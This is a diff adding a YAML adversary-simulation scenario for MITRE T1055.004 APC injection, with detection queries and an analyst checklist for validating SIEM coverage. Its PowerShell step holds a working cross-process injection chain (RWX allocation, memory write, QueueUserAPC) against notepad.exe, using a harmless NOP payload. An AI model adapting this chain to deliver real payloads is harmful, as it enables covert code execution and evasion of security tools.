@@ -1,0 +1,100 @@
+id: T1055.004_apc_injection
+name: "Process Injection — Asynchronous Procedure Call Injection"
+mitre_technique: "T1055.004"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries abuse the Windows Asynchronous Procedure Call (APC) mechanism to queue
+  a function call into a target thread. When the thread enters an alertable wait state
+  (SleepEx, WaitForSingleObjectEx), the queued APC executes. This avoids CreateRemoteThread
+  and is commonly used in Early Bird injection (before process main runs).
+  Key API: OpenProcess → VirtualAllocEx → WriteProcessMemory → OpenThread → QueueUserAPC.
+  This scenario generates the full API chain. Requires elevation.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1055/004/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1055.004 — APC Injection simulation (elevation required)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate QueueUserAPC injection API chain"
+    command: |
+      Add-Type @"
+      using System;
+      using System.Runtime.InteropServices;
+      using System.Diagnostics;
+      public class PASAPCInject {
+          [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int pid);
+          [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+          [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out int w);
+          [DllImport("kernel32.dll")] public static extern IntPtr OpenThread(uint a, bool b, uint tid);
+          [DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+          [DllImport("kernel32.dll")] public static extern bool VirtualFreeEx(IntPtr h, IntPtr a, uint s, uint t);
+          [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
+      }
+"@
+      $target = Start-Process notepad.exe -PassThru
+      Start-Sleep -Milliseconds 800
+      Write-Host "[PAS] Target: notepad.exe PID $($target.Id)"
+
+      $hProc = [PASAPCInject]::OpenProcess(0x1F0FFF, $false, $target.Id)
+      Write-Host "[PAS] OpenProcess: $hProc"
+
+      if ($hProc -ne [IntPtr]::Zero) {
+          $addr    = [PASAPCInject]::VirtualAllocEx($hProc, [IntPtr]::Zero, 4096, 0x3000, 0x40)
+          $payload = [byte[]](0x90) * 64
+          $written = 0
+          [PASAPCInject]::WriteProcessMemory($hProc, $addr, $payload, $payload.Length, [ref]$written) | Out-Null
+          Write-Host "[PAS] VirtualAllocEx(RWX) + WriteProcessMemory: $written bytes"
+
+          $proc = [Diagnostics.Process]::GetProcessById($target.Id)
+          foreach ($thread in $proc.Threads) {
+              $hThread = [PASAPCInject]::OpenThread(0x1F03FF, $false, $thread.Id)
+              if ($hThread -ne [IntPtr]::Zero) {
+                  $queued = [PASAPCInject]::QueueUserAPC($addr, $hThread, [IntPtr]::Zero)
+                  Write-Host "[PAS] QueueUserAPC TID $($thread.Id): queued=$queued (fires on alertable wait)"
+                  [PASAPCInject]::CloseHandle($hThread) | Out-Null
+                  break
+              }
+          }
+          [PASAPCInject]::VirtualFreeEx($hProc, $addr, 0, 0x8000) | Out-Null
+          [PASAPCInject]::CloseHandle($hProc) | Out-Null
+      }
+      $target | Stop-Process -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS] APC injection API chain complete"
+
+  - step: 3
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 5
+
+  - step: 4
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — QueueUserAPC targeting notepad.exe threads from powershell.exe"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Terminate notepad"
+    command: |
+      Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] notepad.exe terminated"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1055.004 cleanup complete"
+
+analyst_checklist:
+  - "API: QueueUserAPC from powershell.exe into notepad.exe thread — cross-process APC queueing"
+  - "MDE: DeviceEvents | where ActionType == 'QueueUserAPCApiCall' and InitiatingProcessFileName == 'powershell.exe'"
+  - "Sentinel: DeviceEvents | where ActionType == 'QueueUserAPCApiCall' and InitiatingProcessFileName not in ('lsass.exe','svchost.exe')"
+  - "CONTROL CHECK: QueueUserAPC into a thread of a different process is extremely unusual in legitimate software"
+  - "CONTROL CHECK: Early Bird APC injection targets suspended processes — alert on QueueUserAPC + process creation in same window"
